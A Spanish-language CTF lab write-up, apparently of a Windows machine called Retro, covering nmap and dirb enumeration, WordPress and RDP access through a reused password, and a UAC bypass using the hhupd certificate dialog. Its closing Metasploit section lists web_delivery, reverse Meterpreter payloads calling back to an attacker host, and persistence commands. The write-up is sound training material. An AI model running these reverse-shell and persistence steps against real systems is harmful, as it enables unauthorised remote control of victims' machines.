# Reconocimiento

## `Escaneo de maquina
nmap -sS --min-rate 5000 -sCV -Pn -p- --open -n 10.10.204.60 -oN tcp_scan

#### `OUTPUT:
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-title: IIS Windows Server
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2024-03-13T00:25:31+00:00; -1s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: RETROWEB
|   NetBIOS_Domain_Name: RETROWEB
|   NetBIOS_Computer_Name: RETROWEB
|   DNS_Domain_Name: RetroWeb
|   DNS_Computer_Name: RetroWeb
|   Product_Version: 10.0.14393
|_  System_Time: 2024-03-13T00:25:27+00:00
| ssl-cert: Subject: commonName=RetroWeb
| Not valid before: 2024-03-12T00:24:31
|_Not valid after:  2024-09-11T00:24:31
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

#### Visualización web

![[Pasted image 20240313004651.png]]

Podemos ver el frontend por defecto de windows IIS server.

#### Versión del OS via RDP

![[Pasted image 20240312220032.png]]

Reconocimiento crackmapexec modulo rdp
``OS/Versión: Windows 10 o Windows Server 2016 Build 14393
## Fuzzing de directorios web con DIRB

Hare uso de la herramienta dirb en busca de algún directorio.

dirb http://10.10.252.250 /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt -o web_fuzzing.txt

![[Pasted image 20240312234841.png]]

Confirmamos que la web exista y vemos su contenido, podemos observar un usuario potencial llamado wade

![[Pasted image 20240312235605.png]]

Volvemos a enumerar directorios esta vez sobre la raiz/retro

![[Pasted image 20240313001231.png]]

Confirmamos que es un wordpress el cms que corre, y hare una busquedad de archivos .php dentro de la carpeta que contiene el cms con dirb

dirb http://10.10.252.250/retro /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt -X .php

![[Pasted image 20240313001835.png]]

Encontramos el login del wordpress, y podemos ver la validación de usuario existente, haremos uso de esto para listar usuarios potenciales

![[Pasted image 20240313002154.png]]

Usando el usuario potencial recolectado anteriormente llamado wade, podemos ver que si existe un usuario con este nombre, por lo que perfilaremos una ataque de fuerza bruta con hydra para conseguir las credenciales.

# Acceso inicial
## Navegando por la web

Al intentar ingresar en el panel de wordpress, via fuerza bruta o ataque de directorio, vemos que no es posible. Recorriendo nuevamente la web, podemos encontrar un comentario dentro de una publicación de wade que parece ser una credencial.

![[Pasted image 20240313005742.png]]

Podemos contemplar que wade dejo una nota para el mismo, en caso de que lo olvidara, procedemos a intentar hacer uso de la credencial.

![[Pasted image 20240313010042.png]]
![[Pasted image 20240313020056.png]]

Logramos entrar dentro del wordpress, pero por una mala practica de reutilización de contraseñas también es posible entrar directamente desde el rdp, entraremos con las credenciales y tomaremos la bandera.

![[Pasted image 20240313011201.png]]

Vemos que tenemos acceso al ordenador, y buscamos la bandera user.txt

# Escalada de privilegios

`Bypass del UAC de administrador Windows

Del resultado de una búsqueda en el navegador podemos ver que el ejecutable del escritorio hhupd, es vulnerable a un bypass, podríamos intentar invocar una shell inversa, o un archivo .php pero el antivirus/firewall lo capa, así que sigamos este camino. 



![[Pasted image 20240313012836.png]]

Podemos ver la información del certificado, y abrirlo en el navegador web lo cual daría la siguiente respuesta 

![[Pasted image 20240313013424.png]]

Nos aparecera que la locación del archivo no esta accesible, luego abriremos el directorio system usando el nombre c:\\windows\\system32\\\*.\* en el campo de nombre y pudiendo acceder a cmd.exe, desde el usuario NT AUTHORITY\\SYSTEM

![[Pasted image 20240313013824.png]]

![[Pasted image 20240313014219.png]]

Buscamos la bandera de root, dentro del escritorio del usuario administrador y finalizamos la maquina

![[Pasted image 20240313014611.png]]

# Metaesploit

 Ya que sabemos que nuestra máquina víctima está ejecutando Windows Defender, ¡vamos a probar un método diferente de entrega de la carga útil! Para ello, vamos a utilizar el exploit de entrega web script dentro de Metasploit. Inicie Metasploit ahora y seleccione 'exploit/multi/script/web_delivery' para su uso.

msfconsole
use exploit/multi/script/web_delivery

En primer lugar, establezcamos el objetivo en PSH (PowerShell). ¿Qué número de objetivo es PSH?

show targets

set target 2

Después de configurar el payload, configuramos el lhost y lport.

set lhost <attacker ip>set lport <attacker port>

En este caso, usaremos un simple payload HTTP inverso. Hazlo ahora con el comando 

set payload windows/meterpreter/reverse_http
run -j

show options
set srvport 8000
run -j

run persistence -X
run persistence -X -r <attcker ip>

background
use exploit/multi/handle
set PAYLOAD windows/meterpreter/reverse_tcp  
set LHOST <attacker ip>
set LPORT 1234 
show options

sessions 1
reboot
